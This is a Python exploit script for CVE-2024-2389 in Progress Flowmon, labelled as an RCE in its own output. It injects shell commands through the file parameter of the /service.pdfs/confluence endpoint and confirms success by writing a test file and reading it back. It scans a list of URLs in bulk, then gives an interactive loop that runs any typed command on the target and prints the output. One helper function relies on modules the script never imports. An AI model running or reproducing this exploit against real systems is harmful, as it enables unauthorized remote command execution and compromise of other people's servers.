import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/service.pdfs/confluence?lang=en&file=$(echo+'helloworld'>qluws.txt)")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    result_url = urljoin(url,'qluws.txt')
    try:
        requests.get(target, verify=False, headers=headers, timeout=15)
        result_response = requests.get(result_url, verify=False, headers=headers, timeout=15)
        if result_response.status_code == 200 and 'helloworld' in result_response.text:
                print(f"\033[31mDiscovered:{url}: ProgressFlowmon_CVE-2024-2389_RCE!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                command = quote(command)
                target = urljoin(url, "/service.pdfs/confluence?lang=en&file=$({}>result.txt)".format(command))
                try:
                    requests.get(target, verify=False, headers=headers, timeout=15)
                    result_url = urljoin(url, 'result.txt')
                    result_response = requests.get(result_url, verify=False, headers=headers, timeout=15)
                    if result_response.status_code == 200:
                        print(result_response.text)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")